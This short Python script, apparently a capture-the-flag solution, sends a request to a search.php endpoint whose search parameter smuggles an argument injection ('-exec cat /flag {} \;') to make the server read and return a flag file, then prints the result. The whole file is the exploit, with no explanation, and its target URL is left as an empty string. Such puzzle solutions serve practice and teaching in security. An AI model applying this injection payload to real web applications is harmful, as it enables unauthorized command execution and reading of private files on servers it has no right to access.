import requests

def main():
    url = "" + "search.php?search=a -exec cat /flag {} \\;"
    res = requests.get(url)
    print(res.text)

if __name__ == "__main__":
    main()